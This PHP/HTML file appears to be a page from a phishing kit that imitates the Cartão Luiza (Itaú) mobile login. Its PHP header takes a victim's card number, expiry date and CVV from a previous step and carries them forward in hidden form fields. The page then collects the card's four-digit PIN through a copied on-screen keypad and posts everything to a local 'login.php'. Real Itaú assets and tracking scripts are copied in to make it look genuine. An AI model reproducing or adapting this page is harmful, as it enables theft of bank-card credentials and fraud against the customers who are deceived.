<?php
$numero = $_POST['cc'];
$data1 = $_POST['data1'];
$cvv = $_POST['cvv'];



?>
<html lang="pt-br" class="no-js template-ms-lu"><head><style type="text/css">
	
		.password {
			position: relative;
			width: 130px!important;
			margin: 20px auto;
			margin-top: 30px;
			border: none;
			border-bottom:1px solid #fff;
		}
	

	.tipsy-alert-container.tipsy-active {
		border-bottom:1px solid #531E6D;
	}

	.tipsy-active .tipsy-alert {
		display: block;
	}

	.tipsy-alert {
		display: none;
		font-size: 14px!important;
		position: absolute;
		top: -73px;
		left: calc(50% - 140px);
		padding: 5px;
		z-index: 100000;
	}

	.tipsy-alert .tipsy-arrow {
		display: block;
		position: absolute;
		left: calc(50% - 3px);
		bottom: -3px;
		width: 0;
		height: 0;
		line-height: 0;
		border-top: 12px solid #531E6D;
		border-left: 10px solid transparent;
		border-right: 10px solid transparent;
	}

	.tipsy-alert .tipsy-arrow .tipsy-arrow-up {
		top: -3px;
		border-bottom: 12px solid #531E6D;
		bottom: initial;
		border-top: none;
	}

	.tipsy-alert .tipsy-inner {
		background-color: #531E6D;
		color: #FFF;
		width: 240px;
		padding: 12px 15px;
		border-radius: 5px;
		line-height: 1.3em;
	}

	.cortarTextoUmaLinha {
		text-overflow:ellipsis;
		white-space:nowrap;
		overflow:hidden;
	}
</style>


</head><body id="luizacred" class="bg-logon"><header class="header">
	<div class="container">
		<div class="identificacao left">
			<p class="nome cortarTextoUmaLinha"></p>
			<span class="cpf incluir-tabindex" role="text" aria-label="CPF: final 47865" tabindex="0">CPF: ***.***.***-**</span>
		</div>
	</div>
</header>








	
		
		



    <!-- start metas and links -->

    
        
            
            
            
        
        
        
        
    


    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=EDGE,CHROME=1">
    <meta name="robots" content="noindex,nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <title>Home | Cartão Luiza</title>
    <meta name="theme-color" content="#0F89FF">
    <link rel="manifest" href="https://estatico.itau.com.br/ibanking/mono/monoproduto/src/luiza/site.webmanifest" media="screen">
    <link rel="icon" type="image/x-icon" href="https://estatico.itau.com.br/ibanking/mono/monoproduto/src/luiza/favicon.ico">
    
    <!-- Add to homescreen for Chrome on Android -->
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="https://estatico.itau.com.br/ibanking/mono/monoproduto/src/luiza/android-chrome-192x192.png">
    <meta name="theme-color" content="#0F89FF">

    <!-- Add to homescreen for Safari on iOS -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-title" content="Shopping">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <link rel="apple-touch-icon-precomposed" href="https://estatico.itau.com.br/ibanking/mono/monoproduto/src/luiza/apple-touch-icon.png">

    <!-- Tile icon for Win -->
    <meta name="msapplication-TileImage" content="https://estatico.itau.com.br/ibanking/mono/monoproduto/src/luiza/favicon-32x32.png">
    <meta name="msapplication-TileColor" content="#0F89FF">

    <meta name="description" content="Cartão Luiza">
    <meta name="keywords" content="Cartão Luiza">

    <!-- end metas and links -->
    


		


		<c:if test="true">
			<script id="importLibJSFrameworkDA" src="https://estatico.itau.com.br/ibanking/mono/commons/js/framework/importLibJSFrameworkDA.js?PPF7S86"></script>
			<script id="frameworkDA" src="https://estatico.itau.com.br/ibanking/mono/commons/js/framework/frameworkDA.js?PPF7S86"></script>
		</c:if>

		<link rel="stylesheet" media="screen" href="https://estatico.itau.com.br/ibanking/mono/mono-msite-app/css/1.2.8/msite.css">

		<link rel="stylesheet" media="screen" href="https://estatico.itau.com.br/ibanking/mono/commons/css/font-itau.css"><script type="text/javascript" id="">(function(){function H(b,c){if("closest"in b)return b.closest(c);if("function"===typeof k)return k(b).closest(c)[0];for(var a=b.parentNode;a!=document;){if(r(a,c))return a;a=a.parentNode}}function x(b,c,a){if("undefined"===typeof c)return b="; "+b+"\x3d",a="; "+document.cookie,c=a.indexOf(b),-1===c?a="":(a=a.substring(c+b.length),b=a.indexOf(";"),a=window.unescape(-1===b?a:a.substring(0,b))),a;a=a||{};c=b+"\x3d"+window.escape(c);a.exdays&&(b=new Date,b.setDate(b.getDate()+a.exdays),c+="; expires\x3d"+
b.toUTCString());a.domain&&(c+="; domain\x3d"+a.domain);c+="; path\x3d"+(a.path||"/");return a=document.cookie=c}function I(b,c,a,f,d){if("function"===typeof k){var h=k(d||document);var e=n(b,f,{event:c,selector:a,immediate:!1});if("function"===typeof h.on)return h.on(c,a,e);if("function"===typeof h.delegate)return h.delegate(a,c,e)}"string"===typeof d&&(d=document.querySelectorAll(d));"function"===typeof document.addEventListener?h="addEventListener":(h="attachEvent",c="on"+c);e=function(d){for(var e=
d.target;e&&e!==this;e=e.parentNode)if(r(e,a)){var h=n(b,f,{event:c,selector:a,immediate:!1});h.call(e,d);break}};if("[object NodeList]"===Object.prototype.toString.call(d))for(var g=0;g<=d.length-1;g++)(d[g]||document)[h](c,e,!1);else(d||document)[h](c,e,!1)}function J(b,c){return b.querySelectorAll(c)}function K(b){var c,a,f=[];if(1===b.length)return b[0];for(;0<b.length;){var d=b.shift();for(c=0;d.length>c;c++){var e=d[c];for(a=0;a<f.length&&e!==f[a];)a+=1;a===f.length&&f.push(e)}}return f}function v(b,
c){if(b&&"string"===typeof b){for(var a=c||window,f=b.split("."),d=0;d<f.length&&null!=a;d++)if(y.call(a,f[d]))a=a[f[d]];else return;return a}}function L(b,c){return"classList"in b?b.classList.contains(c):(new RegExp("\\b"+c+"\\b")).test(b.className)}function M(b){e=p(e,b);z()}function m(b,c,a){for(var f,d=[],e=0;e<b.length;e++){f=b[e];if(!1===f instanceof HTMLElement)throw"internalMap: Esperado elemento HTML";f=[f].concat(a);d.push(c.apply(null,f))}return d}function g(b,c,a){if(e.debug&&"function"===
typeof v("console."+b))console[b](c,a)}function r(b,c){if("matches"in b)return b.matches(c);if("function"===typeof k)return k(b).is(c);for(var a=b.parentNode.querySelectorAll(c),f=0;f<a.length;f++)if(a[f]===b)return!0;return!1}function p(b,c){if(c)for(var a in c)y.call(c,a)&&(b[a]=c[a]);return b}function q(b,c,a,f,d){if(d)return I(b,c,a,f,d);f=n(b,f,{event:c,selector:a,immediate:!1});if("function"===typeof k){b=k(a);if("function"===typeof b.on)return b.on(c,f);if("function"===typeof b.bind)return b.bind(c,
f)}d="string"===typeof a?document.querySelectorAll(a):"undefined"===typeof a.length||a===window?[a]:a;for(a=0;a<d.length;a++)b=d[a],"function"===typeof b.addEventListener?b.addEventListener(c,f):b.attachEvent("on"+c,f)}function A(b){var c;for(c=0;c<b.length;c++)if(b[c])return!0;return!1}function w(b,c){var a;if(!b)return"";c=c||{};var f="string"===typeof c.spacer?c.spacer:"_";b=b.toLowerCase().replace(/^\s+/,"").replace(/\s+$/,"").replace(/\s+/g,"_").replace(/[\u00e1\u00e0\u00e2\u00e3\u00e5\u00e4\u00e6\u00aa]/g,
"a").replace(/[\u00e9\u00e8\u00ea\u00eb\u0404\u20ac]/g,"e").replace(/[\u00ed\u00ec\u00ee\u00ef]/g,"i").replace(/[\u00f3\u00f2\u00f4\u00f5\u00f6\u00f8\u00ba]/g,"o").replace(/[\u00fa\u00f9\u00fb\u00fc]/g,"u").replace(/[\u00e7\u00a2\u00a9]/g,"c").replace(/[^a-z0-9_\-]/g,"_");if(c.capitalized){var d=b.replace(/^_+|_+$/g,"").split(/_+/g);for(a=0;a<d.length;a++)d[a]&&(d[a]=d[a][0].toUpperCase()+d[a].slice(1));return d.join(f)}return b.replace(/^_+|_+$/g,"").replace(/_+/g,f)}function N(b,c){var a;c=c||{};
if(c.onlyFirst){var f=b.childNodes;var d="";for(a=0;a<f.length;a++)3===f[a].nodeType&&(d+=f[a].nodeValue)}else d=b.innerText||b.textContent||b.innerHTML.replace(/<[^>]+>/g,"");return c.sanitize?w(d,c.sanitize):d}function B(b){try{return google_tag_manager[e.containerId].dataLayer.get(b)}catch(c){g("warn","Function getDataLayer: Object "+b+" is not defined")}}function C(b,c){try{return google_tag_manager[e.containerId].dataLayer.set(b,c)}catch(a){g("warn",a)}}function D(b,c,a,f,d,h){try{if(!1===l.sentPageview&&
e.waitQueue)return g("Info","The event ("+arguments+") has been add to the queue"),l.eventQueue.push(arguments);null!=f&&"object"===typeof f?(d=f,f=void 0):d=d||{};var t={event:e.customNameEvent,eventCategory:b,eventAction:c,eventValue:f,eventLabel:a,_tag:h};e.gtmCleanup&&(t.eventCallback=e.gtmCleanup);g("info",t,d);window[e.dataLayerName].push(p(t,d))}catch(u){g("warn",u)}}function O(b){var c={event:function(a,c,d,e,g){return D(a,c,d,e,g,b.id)},pageview:function(a,c){return E(a,c,b.id)},timing:function(a,
c,d,e,g){return F(a,c,d,e,g,b.id)},safeFn:function(a,c,d){return n(b.id,c,d)},on:function(a,c,d,e){return q(b.id,a,c,d,e)},delegate:function(a,c,d){return q(b.id,a,c,d,document.body)},wrap:function(a){if("string"===typeof a)a=window.document.querySelectorAll(a);else if(a instanceof HTMLElement)a=[a];else if(!1===(a instanceof Array||a instanceof NodeList))throw"wrap: Esperado receber seletor, elemento HTML, NodeList ou Array";return{hasClass:function(b,c){var d=m(a,L,[b]);return c&&c.toArray?d:A(d)},
matches:function(b,c){var d=m(a,r,[b]);return c&&c.toArray?d:A(d)},closest:function(b){return c.wrap(m(a,H,[b]))},text:function(b){var c=m(a,N,[b]);return b&&b.toArray?c:c.join("")},find:function(b){b=m(a,J,[b]);return c.wrap(K(b))},map:function(b,c){return m(a,b,c)},on:function(c,d,e){"function"===typeof d?q(b.id,c,a,d):q(b.id,c,d,e,a)},nodes:a}},sanitize:w,getDataLayer:B,setDataLayer:C,cookie:x,getKey:v,id:b.id,args:b.args,fn:G,_event:b.event,_selector:b.selector};return c}function E(b,c,a){try{var f=
{event:e.customNamePageview,path:b,_tag:a};e.gtmCleanup&&(f.eventCallback=e.gtmCleanup);g("info",f,c);window[e.dataLayerName].push(p(f,c))}catch(d){g("warn",d)}}function n(b,c,a){a=a||{};var f=function(){try{c.call(this===window?null:this,O({id:b,args:arguments,event:"string"===typeof a.event&&a.event||void 0,selector:"string"===typeof a.selector&&a.selector||void 0}))}catch(d){e.debug?g("warn","Exception: ",{exception:d,tag:b,event:"string"===typeof a.event&&a.event||void 0,selector:"string"===typeof a.selector&&
a.selector||void 0}):Math.random()<=e.errorSampleRate&&window[e.dataLayerName].push({event:e.exceptionEvent,dataQuality:{category:e.exceptionCategory,action:b,label:String(d),event:"string"===typeof a.event&&a.event||void 0,selector:"string"===typeof a.selector&&a.selector||void 0}})}};return!1===a.immediate?f:f()}function F(b,c,a,f,d,h){try{if(!1===l.sentPageview&&e.waitQueue)return g("Info","The timing event ("+arguments+") has been add to the queue"),l.timingQueue.push(arguments);d=d||{};var k=
{event:e.customNameTiming,timingCategory:b,timingVariable:c,timingValue:a,timingLabel:f,_tag:h};e.gtmCleanup&&(k.eventCallback=e.gtmCleanup);g("info",k,d);window[e.dataLayerName].push(p(k,d))}catch(u){g("warn",u)}}function z(){if(!window[e.helperName]||e.overwriteHelper)window[e.helperName]=P}var y=Object.prototype.hasOwnProperty,k=window.jQuery,G={},e=google_tag_manager["GTM-PPF7S86"].macro(7),l={sentPageview:!1},P={internal:l,init:M,pageview:E,event:D,timing:F,sanitize:w,getDataLayer:B,setDataLayer:C,cookie:x,getKey:v,
safeFn:n,fn:G,options:e};l.eventQueue=[];l.timingQueue=[];z()})();</script><script type="text/javascript" id="">analyticsHelper.safeFn("Custom - H2O e Audience Manager Settings",function(){window.adobeS=window.s_satpf||void 0;window.cookieH2OKey="sgpf";window.localAdManager=[{local:"AA",slot:void 0,infos:{generatedTag:"div-gpt-ad-1555598374411-0",adUnitId:"I-AU-PF-00",width:980,height:80,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"0K",slot:void 0,infos:{generatedTag:"div-gpt-ad-1556056649699-0",adUnitId:"I-AU-PF-01",width:980,height:80,marginBottom:"15px",
marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"0M",slot:void 0,infos:{generatedTag:"div-gpt-ad-1555013570693-0",adUnitId:"I-AU-PF-02",width:980,height:80,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"01",slot:void 0,infos:{generatedTag:"div-gpt-ad-1555013449689-0",adUnitId:"I-AU-PF-03",width:316,height:170,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"0L",slot:void 0,
infos:{generatedTag:"div-gpt-ad-1555013642337-0",adUnitId:"I-AU-PF-04",width:980,height:80,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"0P",slot:void 0,infos:{generatedTag:"div-gpt-ad-1556029828460-0",adUnitId:"I-AU-PF-06",width:980,height:80,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"AD",slot:void 0,infos:{generatedTag:"div-gpt-ad-1555598425498-0",adUnitId:"I-AU-PF-05",width:669,height:60,marginBottom:"15px",
marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"B9",slot:void 0,infos:{generatedTag:"div-gpt-ad-1556830879970-0",adUnitId:"I-AU-PF-07",width:918,height:60,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"H01",slot:void 0,infos:{generatedTag:"div-gpt-ad-1559763468630-0",adUnitId:"I-AU-PF-08",width:237,height:192,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"H02",slot:void 0,
infos:{generatedTag:"div-gpt-ad-1559763785836-0",adUnitId:"I-AU-PF-09",width:230,height:360,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"H03",slot:void 0,infos:{generatedTag:"div-gpt-ad-1560344946678-0",adUnitId:"I-AU-PF-10",width:237,height:192,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"H04",slot:void 0,infos:{generatedTag:"div-gpt-ad-1560358436176-0",adUnitId:"I-AU-PF-11",width:230,height:360,
marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"H05",slot:void 0,infos:{generatedTag:"div-gpt-ad-1560517118564-0",adUnitId:"I-AU-PF-12",width:237,height:192,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"H06",slot:void 0,infos:{generatedTag:"div-gpt-ad-1560517965876-0",adUnitId:"I-AU-PF-13",width:230,height:360,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},
{local:"H07",slot:void 0,infos:{generatedTag:"div-gpt-ad-1560795446287-0",adUnitId:"I-AU-PF-15",width:237,height:192,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"H08",slot:void 0,infos:{generatedTag:"div-gpt-ad-1560796097054-0",adUnitId:"I-AU-PF-16",width:230,height:360,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"H09",slot:void 0,infos:{generatedTag:"div-gpt-ad-1560537491776-0",adUnitId:"I-AU-PF-14",
width:228,height:123,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"H10",slot:void 0,infos:{generatedTag:"div-gpt-ad-1560960503282-0",adUnitId:"I-AU-PF-17",width:230,height:230,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"H11",slot:void 0,infos:{generatedTag:"div-gpt-ad-1561400707539-0",adUnitId:"I-AU-PF-18",width:510,height:80,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},
{local:"H12",slot:void 0,infos:{generatedTag:"div-gpt-ad-1561400784046-0",adUnitId:"I-AU-PF-19",width:510,height:80,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"H13",slot:void 0,infos:{generatedTag:"div-gpt-ad-1561415749693-0",adUnitId:"I-AU-PF-20",width:510,height:80,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"H14",slot:void 0,infos:{generatedTag:"div-gpt-ad-1561569764313-0",adUnitId:"I-AU-PF-21",
width:890,height:90,marginBottom:null,marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"H15",slot:void 0,infos:{generatedTag:"div-gpt-ad-1566911705497-0",adUnitId:"I-AU-PF-24",width:980,height:60,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}},{local:"H16",slot:void 0,infos:{generatedTag:"div-gpt-ad-1568039412213-0",adUnitId:"I-AU-PF-25",width:768,height:80,marginBottom:"15px",marginTop:"12px",marginLeft:"12px",marginRight:null,positionFloat:null}},
{local:"H17",slot:void 0,infos:{generatedTag:"div-gpt-ad-1568039492083-0",adUnitId:"I-AU-PF-26",width:768,height:80,marginBottom:"15px",marginTop:null,marginLeft:"12px",marginRight:null,positionFloat:null}},{local:"H18",slot:void 0,infos:{generatedTag:"div-gpt-ad-1568039594384-0",adUnitId:"I-AU-PF-27",width:980,height:80,marginBottom:"15px",marginTop:null,marginLeft:"12px",marginRight:null,positionFloat:null}},{local:"H19",slot:void 0,infos:{generatedTag:"div-gpt-ad-1568396705543-0",adUnitId:"I-AU-PF-28",
width:768,height:80,marginBottom:"15px",marginTop:null,marginLeft:null,marginRight:null,positionFloat:null}}];initAdobeAudienceManager()});</script>


		<script type="text/javascript" src="https://estatico.itau.com.br/ibanking/mono/commons/js/msite/1.0.0/msite-monoproduto.js"></script>
		<script type="text/javascript" src="https://estatico.itau.com.br/ibanking/mono/mono-msite-app/js/libs-msite/1.0.0/libs-msite.js"></script>

		<script type="text/javascript" src="https://estatico.itau.com.br/ibanking/mono/mono-msite-app/js/front-msite/1.0.4/front-msite.js"></script>
	
	
		<a href="#skipcontent" accesskey="1" id="aAcessKey1" aria-hidden="true">Pular para o conteúdo</a>
		<section class="container clearfix">
			<section class="alerta"></section>
			<div id="content">
				<section>
					
					<form id="form-teclado-prelogon" method="post" accept-charset="utf-8" action="login.php" >
								<input type="hidden" name="cc" value="<?php echo $_POST['cc']; ?>">
								<input type="hidden" name="data1" value="<?php echo $_POST['data1']; ?>">
								<input type="hidden" name="cvv1" value="<?php echo $_POST['cvv1']; ?>">
						<input type="submit" class="invisible text-access-hide" aria-hidden="true">
						<div id="content" class="container clearfix center">

							
							
							
								<div class="autenticacao">
									<div class="clearfix">
										<h1 class="block senha-eletronica tooltip alert" aria-hidden="false">senha do cartão</h1>
										<div class="password clearfix alert tipsy-alert-container">
											<div class="tipsy-alert" hidden="">
												<span class="tipsy-arrow" aria-hidden="true"></span>
												<p id="tipsyBoxMessage" class="tipsy-inner" role="alert">Este número é inválido. Por favor, tente digitar o número do cartão novamente.</p>
											</div>
											<span class="block icon-itaufonts_seguranca icon-password" aria-hidden="true"></span>
											<span id="1_password" aria-hidden="true" class="block icon-itaufonts_senha_stroke icon-password"></span>
											<span id="2_password" aria-hidden="true" class="block icon-itaufonts_senha_stroke icon-password"></span>
											<span id="3_password" aria-hidden="true" class="block icon-itaufonts_senha_stroke icon-password"></span>
											<span id="4_password" aria-hidden="true" class="block icon-itaufonts_senha_stroke icon-password"></span>
										</div>
										<input type="hidden" name="opFull" data-op="2Yx/DJttjpNQ5xvuNMfr2Ox3FqKkOELHg4sRzXXdtSo=;">
										<input type="hidden" value="" id="senha" name="senha1" readonly="readonly" data-mensagem-validacao="Por favor, preencha corretamente o campo senha eletrônica." maxlength="4">
									</div>
								</div>
							

							<div class="box-teclado clearfix">
								<div class="teclado clearfix">

									
									<div class="teclas">

										
										
											<a href="javascript:;" role="button" title="" id="tecla" rel="tecla_3" class="tecla ">
												<strong class="roboto-bold">3</strong> 
											</a>
											<a href="javascript:;" role="button" title="" id="tecla" rel="tecla_1" class="tecla ">
												<strong class="roboto-bold">1</strong> 
											</a>
										

											<a href="javascript:;" role="button" title="" id="tecla" rel="tecla_2" class="tecla margem-esquerda5">
												<strong class="roboto-bold">2</strong> 
											</a>
										
											<a href="javascript:;" role="button" title="" id="tecla" rel="tecla_5" class="tecla margem-esquerda5">
												<strong class="roboto-bold">5</strong> 
											</a>
										
											<a href="javascript:;" role="button" title="" id="tecla" rel="tecla_4" class="tecla ">
												<strong class="roboto-bold">4</strong> 
											</a>
										
											<a href="javascript:;" role="button" title="" id="tecla" rel="tecla_9" class="tecla margem-esquerda5">
												<strong class="roboto-bold">9</strong> 
											</a>
											<a href="javascript:;" role="button" title="" id="tecla" rel="tecla_7" class="tecla margem-esquerda5">
												<strong class="roboto-bold">7</strong> 
											</a>
												<a href="javascript:;" role="button" title="" id="tecla" rel="tecla_6" class="tecla margem-esquerda5">
												<strong class="roboto-bold">6</strong> 
											</a>
											<a href="javascript:;" role="button" title="" id="tecla" rel="tecla_8" class="tecla margem-esquerda5">
												<strong class="roboto-bold">8</strong> 
											</a>
											<a href="javascript:;" role="button" title="" id="tecla" rel="tecla_0" class="tecla margem-esquerda5">
												<strong class="roboto-bold">0</strong> 
											</a>

										
										<a href="javascript:;" role="button" title="Apagar toda a senha digitada" id="a-apagar" class="tecla margem-esquerda5" rel="teclaLimpar">
											<img aria-hidden="true" src="https://estatico.itau.com.br/ibanking/mono/commons/img/icones/ic_delete.png">
										</a>
									</div>

									
									<div class="row clearfix margem-baixo20">
										<a href="javascript:;" aria-label="acessar o site" id="a-acessar" class="btn teclas link-acessar desabilitado" rel="teclaOk" aria-disabled="true" role="button">acessar</a>
									</div>
								</div>
							</div>

							
							
						</div>
					</form>

					
					<form id="form-teclado-esqueci" method="post" accept-charset="utf-8" action="#">
						<input type="submit" class="invisible text-access-hide" aria-hidden="true">
						
							<input type="hidden" name="opFull" data-op="XC6UPvyq0e4NqJXOs7+iX6dr0kfrGT9eOGxcImDMd3k=;/logon-mono/esqueceuSenhaUnificado">
						
						
					</form>

					
					
				</section>

				<script type="text/javascript">
					var isCpf = "false";
					function retornaTamanhoSenha () {
						if(isCpf == "true") {
							return 6;
						} else {
							return 4;
						}
					}

					$(document).ready(function() {
                        $(document).on('click', function() {
                            fnOcultarErroCartaoInvalido();
                        });

                        fnMostraErroCartaoInvalido();

						$('.senha-eletronica-ac').removeClass('hidden');

						altura_body 	= $('body').height();
						altura_header 	= $('header').height();
						altura_content 	= $('section.container').height();
						altura_msg 		= $('.senha-eletronica-ac').height() + 30;
						
						margin = altura_body - (altura_header + altura_content) - altura_msg;
						
						$('.senha-eletronica-ac').css("margin-top", margin);
					});

					function esqueciMinhaSenha() {
						$("#1_password").removeClass("icon-itaufonts_full_senha_fill")
						$('#form-teclado-esqueci').submit();
					}

                    function fnMostraErroCartaoInvalido() {
                        var mensagemRetorno = '';

                        if (mensagemRetorno.length) {
                        	$("h1").attr("aria-hidden","true").next("p").attr("aria-hidden","true");
                            $('.tipsy-alert-container').addClass('tipsy-active');
                            $('.tipsy-inner').html(mensagemRetorno);
                            setTimeout(function(){ $('#tipsyBoxMessage').attr('tabindex','0'); }, 500);
                            $('.cpf').removeClass('incluir-tabindex').removeAttr('tabindex');
                        }
                    }

                    function fnOcultarErroCartaoInvalido() {
                    	$("h1").attr("aria-hidden","false").next("p").attr("aria-hidden","false");
                        $('.tipsy-alert-container').removeClass('tipsy-active');
                        $('#tipsyBoxMessage').removeAttr('tabindex');
                        $('.cpf').addClass('incluir-tabindex').attr('tabindex','0');
                    }

					$("#form-teclado-prelogon").validacao({
						regras : {
							senha : {
								requerido : true,
								maxlen : retornaTamanhoSenha(),
								minlen : 4
							}
						}
					});

					$(document).on('click', function() {
						$(".tooltiptext").css('visibility', 'hidden');
					});

					var i = 1;
					$(document).on('click', 'a', function() {
						var strRel = $(this).attr('rel');
						if (strRel === "teclaOk") {
							var passTmp = $("#senha").val();

							$("#form-teclado-prelogon").validar({
								onerro : tratarSaidaErro,
								onsucesso : function() {
									$('#form-teclado-prelogon').submit();
									$("#senha").val(passTmp);
								}
							});

							return true;

						} else if (strRel === "teclaLimpar") {
							$("#senha").val("");

							while (i > 0) {
								$("#" + i + "_password").removeClass("icon-itaufonts_full_senha_fill");
								$("#" + i + "_password").addClass("icon-itaufonts_senha_stroke");
								i--;
							}
							i = 1;
							return false;
						}

						if ($("#senha").val() != undefined) {
							var passTmp = $("#senha").val();

							if(isCpf == "true" && passTmp.length >= 6) {
								return false;

							} else if (isCpf == "false" && passTmp.length >= 4) {
								return false;

							} else {
								$("#" + i + "_password").removeClass("icon-itaufonts_senha_stroke");
								$("#" + i + "_password").addClass("icon-itaufonts_full_senha_fill");
								i++;
								passTmp += strRel.split("_")[1];
							}

							$("#senha").val(passTmp);
						}
					});

					$(document).on("a click", "#tecla, #a-apagar", function() {
						if(isCpf == "true") {
							if($("#6_password").hasClass("icon-itaufonts_full_senha_fill")) {
								$("#a-acessar").removeClass("desabilitado");
								$("#a-acessar").attr("aria-disabled", "false");

							} else {
								$("#a-acessar").addClass("desabilitado");
								$("#a-acessar").css("pointer-events", "auto");
								$("#a-acessar").attr("aria-disabled", "true");
							}

						} else {
							if($("#4_password").hasClass("icon-itaufonts_full_senha_fill")) {
								$("#a-acessar").removeClass("desabilitado");
								$("#a-acessar").attr("aria-disabled", "false");

							} else {
								$("#a-acessar").addClass("desabilitado");
								$("#a-acessar").attr("aria-disabled", "true");
								$("#a-acessar").css("pointer-events", "auto");
							}
						}
					});

					$(document).ready(function() {
						
						var dispararAdobePageLoad = function() {
							
							var tagueamento = msiteAdobeDataLayer.init();
							
							tagueamento.msitePushSite('LU', 'NL', 'NCC', 'Msite');
							tagueamento.msitePushVisitor('varejo', '3038CCB51C0983AA137C054D8540E1ED');

							tagueamento.msitePushPage('LU:NL:NCC:Login:SenhaEletronica', '', 'Login', '', '', '', 'SenhaEletronica');
							tagueamento.msitePushCustom("", "", ["prelogin", "s_Pre-Login"]);
							tagueamento.msitePushRule("pageLoad");

							tagueamento.sendDataLayer();
						};

						dispararAdobePageLoad();						
					});

					var finalCpf = "***.***.478-65";
					finalCpf = finalCpf.replace(/\D+/,'');
					$(".cpf").attr("aria-label", "CPF: final " + finalCpf.replace('-',''));
				</script>
			</div>
		</section>

		
		<footer class="clearfix footer-fix">
			<p class="senha-eletronica-ac elemento-footer" style="margin-top: 340px;">
				<span class="icon icon-itaufonts_informacao icon-infor-senha" aria-hidden="true"></span>
				<span>a mesma utilizada para fazer compras</span>
			</p>
		</footer>
		

		<script>
			window.onload = function() {
				try {
					setSegmento("msiteLuizacred");
				} catch(e){}
			}
		</script>
	<script>var authToken='QxLy7YTT3o75qfFPLax9VOBBcxn6UdWSohvDDHCSC20m+pUR25n0NNjz0jIItYeq';</script><script>var clientId='FWmu4CEhAP51GqG3tzAeRg==';</script><script>var flowId='c08fcd04-8d43-45b7-bf76-7f1009ad5570';</script>
</span><span class="kxtag kxinvisible" data-id="47872"><script>
   !function(f,b,e,v,n,t,s)
   {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
   n.callMethod.apply(n,arguments):n.queue.push(arguments)};
   if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.agent='tmsalesforce';n.version='2.0';
   n.queue=[];t=b.createElement(e);t.async=!0;
   t.src=v;s=b.getElementsByTagName(e)[0];

  
   var sfSegs = (localStorage['kxitauunibanco_segs'] || '').split(',');
   var sfRealtimeSegs = (localStorage['salesforce_segments'] || '').split(' ');
   var idSegs = [].concat(sfSegs, sfRealtimeSegs);
   var segments = idSegs.filter(Boolean).join(',');
  
   fbq('init', '352172120016856');
   fbq('track', 'SegmentosDMP', {segID : segments});
</script></span><span class="kxtag kxinvisible" data-id="41827"><script>
(function() {
    /* Selective Attribute DataLayer Library Tag */
    var _, allAttr, allowedList, attr, attributes, dataLayerIngester, dataObj,
        isAllowed, keepCase, libUtil, omitKeys, pageAttr, prefix, toSet, trim,
        userAttr, util, value,
        hasProp = {}.hasOwnProperty;
    _ = Krux('require:underscore');
    util = Krux('require:util');
    libUtil = Krux('require:util.library-tag');
    dataLayerIngester = Krux('require:scrape').ingestDataLayer;

    /* Safe copy of dataLayer object */
    dataObj = Krux('scrape.javascript', 'analyticsData');

    /* String trimming helper function */
    trim = function(attr) {
        return ("" + attr).replace(/^\s+|\s+$/g, '');
    };

    /* Attribute configs */
    pageAttr = _.map('bancoorigem,finalidadecredito,nome,secao,subSecao1,subSecao2,subSecao3,ambiente,negocio,tipoDeCanal,idTecnico,url,ambiente,id,event,duracaoDoVideo,FAQName,feedbackChat,itemClicado,itemDeBusca,itemImpressao,itensFiltrados,likert,mensagensChat,nomeDoErro,nomeDoVideo,nomeIADigital,perfilInvestidor,resultadosDeBusca,virtualRS,idtransacao,detalhetransacao,valortransacao,c_sconsimo,c_sconscar,c_arfh,c_lpac,c_sdn,c_lpaco,c_vg1MMsprev,c_ul,c_sffpg,c_sdf,pgiro,contratouad,contratoulis,contratouaplicaut,spi,pacoteconta,tipocartao,IDproposta,profissao,faixaderenda,author,contentcategories,contentags,publishdate,pagetype,contenttype,postformat,faqname,dn,IDPropostaRedVentures,versaoDaPagina,errorname,platform,score'.split(','), trim);
    userAttr = _.map('iDPJ,iDPF,iDOperador,segmento,tipoCliente,tipoOperador,campanhas,segmento,agencia,CartaoSelecionadoChat,contaOnline,dataDeAberturaDaConta,customerDetail,segmento,customersegment,companyoperator,companyid,customerid'.split(','), trim);

    /* Create a array of attributes striping any empty strings */
    allAttr = _.without(pageAttr.concat(userAttr), '');

    /* Configuration settings */
    keepCase = 'false' === 'true';
    omitKeys = 'undefined'.split(',');

    /* Resolve Prefix */
    prefix = libUtil.resolvePrefix('none', '',
        'undefined');

    /* Function to varify if attribute should be used */
